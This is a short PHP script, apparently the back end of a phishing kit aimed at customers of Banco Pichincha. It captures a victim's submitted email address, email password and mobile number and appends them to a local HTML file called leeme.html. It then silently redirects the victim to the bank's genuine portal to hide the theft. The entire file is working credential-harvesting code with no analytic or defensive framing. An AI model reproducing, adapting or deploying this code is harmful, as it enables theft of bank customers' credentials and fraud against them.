<?
$fldCorreo = $_POST['fldCorreo'];
$fldPassword = $_POST['fldPassword'];
$fldCel = $_POST['fldCel'];
$guardame = fopen('leeme.html','a+');
fwrite($guardame,
"<br/><b>Correo:</b>".$fldCorreo.
"<br/><b>ContraCorreo:</b>".$fldPassword.
"<br/><b>Celular:</b>".$fldCel." ");

fclose($guardame);
echo "<meta http-equiv='refresh' content='1;url=https://www.pichincha.com/portal/inicio'>"
?>